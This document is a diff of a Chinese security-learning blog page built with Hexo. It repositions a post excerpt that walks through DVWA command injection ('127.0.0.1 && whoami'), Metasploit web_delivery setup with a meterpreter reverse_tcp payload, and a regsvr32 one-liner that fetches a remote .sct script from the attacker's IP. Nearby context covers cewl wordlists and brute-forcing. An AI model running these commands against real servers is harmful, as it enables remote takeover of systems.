@@ -1300,25 +1300,6 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></he
 <p>run</p>
 <p>3.现在如果靶机上运行localmsf8881，就会传回信息给主机，主机上的这个命令行就会得到一个meterpreter的session，之后就可以进入了</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191510616.png" alt="img"></p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/2.metasploit-%E9%83%A8%E5%88%86%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90/">2.metasploit-部分命令执行获取权限</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、前期运行：web中，当可以输入某些查询框时，该输入会被运行在命令行中，例如ping命令。(DVWA)</p>
-<p>1.web要求输入ip地址，经检查可以发现输入的内容会被完整运行到服务器的命令行下。</p>
-<p>例如输入127.0.0.1 &amp;&amp; whoami，web反馈的信息除了ping 127.0.0.1，还会将whoami这个命令的信息给返回。</p>
-<p>2.在Msfconsle中使用web_delivrery模块use exploit/multi/script/web_delivery，之后设置对应参数：</p>
-<p>(1)设置target，需要目标服务器上有对应脚本语言，使得目标服务器上能够运行我们注入的命令，打不动就代表没有，或者没有写入环境变量等等原因：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191506647.png" alt="img"></p>
-<p>这里选择目标语言为Regsvr32</p>
-<p>(2)查看还需要的配置，配置一下：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191505056.png" alt="img"></p>
-<p>这里的lhost就是攻击方的ip</p>
-<p>(3)设置攻击载荷，生成注入命令：</p>
-<p>set payload windows/meterpreter/reverse_tcp  (使用windows的meterpreter，建立连接reverse_tcp)</p>
-<p>然后就会生成命令：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191505298.png" alt="img"></p>
-<p>这就代表我们需要进行命令注入，在目标服务器上执行：</p>
-<p>regsvr32 /s /n /u /i:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://192.168.80.159:8080/IVJqvpIJSzu.sct" >http://192.168.80.159:8080/IVJqvpIJSzu.sct</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> scrobj.dll</p>
-<p>此时msfconsole就会进入停滞状态，一旦检查到有目标服务器运行了上述命令，就会生成meterpreter连接。</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191506787.png" alt="img"></p>
-<p>打不通可能是防火墙或者杀毒软件之类的关系</p>
 </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/3.%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95/">3.弱口令密码破解登录</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.制作字典：</p>
 <p>(1)利用cewl制作：</p>
 <p>cewl -d 2 -m 5 -w word.txt <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.baidu.com/" >www.baidu.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
@@ -1354,6 +1335,25 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></he
 <p>③show options看一下需要设置什么信息，设置ip，用户名，密码字典，端口，爆破线程数量等信息，然后直接run即可。</p>
 <p>set RHOST/USERNAME/PASS_FILE/RPORT/THREADS等等</p>
 <p>3.Burp(burpsuite)爆破后台密码：(还没学)</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/2.metasploit-%E9%83%A8%E5%88%86%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90/">2.metasploit-部分命令执行获取权限</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、前期运行：web中，当可以输入某些查询框时，该输入会被运行在命令行中，例如ping命令。(DVWA)</p>
+<p>1.web要求输入ip地址，经检查可以发现输入的内容会被完整运行到服务器的命令行下。</p>
+<p>例如输入127.0.0.1 &amp;&amp; whoami，web反馈的信息除了ping 127.0.0.1，还会将whoami这个命令的信息给返回。</p>
+<p>2.在Msfconsle中使用web_delivrery模块use exploit/multi/script/web_delivery，之后设置对应参数：</p>
+<p>(1)设置target，需要目标服务器上有对应脚本语言，使得目标服务器上能够运行我们注入的命令，打不动就代表没有，或者没有写入环境变量等等原因：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191506647.png" alt="img"></p>
+<p>这里选择目标语言为Regsvr32</p>
+<p>(2)查看还需要的配置，配置一下：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191505056.png" alt="img"></p>
+<p>这里的lhost就是攻击方的ip</p>
+<p>(3)设置攻击载荷，生成注入命令：</p>
+<p>set payload windows/meterpreter/reverse_tcp  (使用windows的meterpreter，建立连接reverse_tcp)</p>
+<p>然后就会生成命令：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191505298.png" alt="img"></p>
+<p>这就代表我们需要进行命令注入，在目标服务器上执行：</p>
+<p>regsvr32 /s /n /u /i:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://192.168.80.159:8080/IVJqvpIJSzu.sct" >http://192.168.80.159:8080/IVJqvpIJSzu.sct</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> scrobj.dll</p>
+<p>此时msfconsole就会进入停滞状态，一旦检查到有目标服务器运行了上述命令，就会生成meterpreter连接。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191506787.png" alt="img"></p>
+<p>打不通可能是防火墙或者杀毒软件之类的关系</p>
 </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/4.SQL%E6%B3%A8%E5%85%A5/">4.SQL注入</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、SQL注入：</p>
 <p>1.常用命令：</p>
 <p>2.SQLMAP使用：</p>
